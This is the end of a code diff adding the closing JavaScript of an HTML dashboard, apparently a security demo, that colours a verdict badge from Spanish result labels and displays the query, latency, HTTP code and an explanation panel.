+      } else if (verdictTitle.includes('PROTEGIDO') || verdictTitle.includes('SALVAGUARDADA') || verdictTitle.includes('LIMPIA') || verdictTitle.includes('ROBUSTO')) {
+        badge.className = 'badge bg-success font-mono';
+      } else {
+        badge.className = 'badge bg-info font-mono text-dark';
+      }
+      badge.textContent = verdictTitle;
+
+      document.getElementById('boxQuery').textContent = queryText;
+      document.getElementById('lblLatency').textContent = `${latency} ms`;
+      document.getElementById('pipelineLatency').textContent = `Latencia total: ${latency} ms`;
+      document.getElementById('lblHttpCode').textContent = `HTTP ${httpCode}`;
+      
+      document.getElementById('boxExplanation').innerHTML = `
+        <i class="fa-solid fa-graduation-cap text-primary me-1"></i>
+        <strong>${headerTitle}:</strong> ${explanation}
+      `;
+    }
+
+    function showError(err) {
+      document.getElementById('badgeVerdict').className = 'badge bg-danger font-mono';
+      document.getElementById('badgeVerdict').textContent = 'ERROR DE RED / SERVICIO';
+      document.getElementById('boxQuery').textContent = typeof err === 'object' ? JSON.stringify(err, null, 2) : err.toString();
+    }
+
+    // Inicialización al cargar la ventana
+    window.addEventListener('DOMContentLoaded', () => {
+      loadStats();
+    });
+  </script>
+</body>
+</html>
